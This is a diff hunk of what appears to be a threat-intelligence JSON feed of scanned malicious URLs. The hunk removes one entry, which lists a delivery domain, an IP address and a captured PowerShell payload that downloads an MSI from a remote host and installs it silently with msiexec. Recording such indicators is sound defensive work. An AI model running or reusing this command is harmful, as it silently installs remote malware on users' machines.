@@ -2067,24 +2067,5 @@
     ],
     "ReportId": "cmwds9z2204os0omlpy5c0lbi",
     "ScannedAt": "2026-11-12T16:49:59.425000+00:00"
-  },
-  {
-    "UrlDomain": "eqx.com.br",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "50.116.112.21"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwdrfian04ln0omlizrkni0i",
-    "ScannedAt": "2026-11-12T16:26:18.120000+00:00"
   }
 ]
